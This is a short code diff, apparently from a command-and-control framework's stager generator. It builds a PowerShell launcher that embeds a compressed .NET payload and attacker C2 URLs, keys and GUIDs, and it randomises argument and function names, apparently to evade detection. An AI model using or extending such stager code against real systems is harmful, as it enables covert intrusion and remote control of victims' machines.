@@ -32,6 +32,7 @@ class STStager(Stager):
                 guid = uuid.uuid4()
                 psk = gen_stager_psk()
 
+                template = template.replace("ARGS_NAME", gen_random_string(6))
                 if bool(self.options['AsFunction']['Value']) is True:
                     function_name = gen_random_string(6).upper()
                     template = f"""function Invoke-{function_name}
@@ -48,9 +49,9 @@ class STStager(Stager):
 Invoke-{function_name} -Guid '{guid}' -Psk '{psk}' -Url '{c2_urls}'
 """
                 else:
-                    template = template.replace("$Url", f'{c2_urls}')
-                    template = template.replace("$Guid", f'{guid}')
-                    template = template.replace("$Psk", f'{psk}')
+                    template = template.replace("$Url", f'"{c2_urls}"')
+                    template = template.replace("$Guid", f'"{guid}"')
+                    template = template.replace("$Psk", f'"{psk}"')
 
                 assembly = assembly.read()
                 template = template.replace("BASE64_ENCODED_ASSEMBLY", dotnet_deflate_and_encode(assembly))
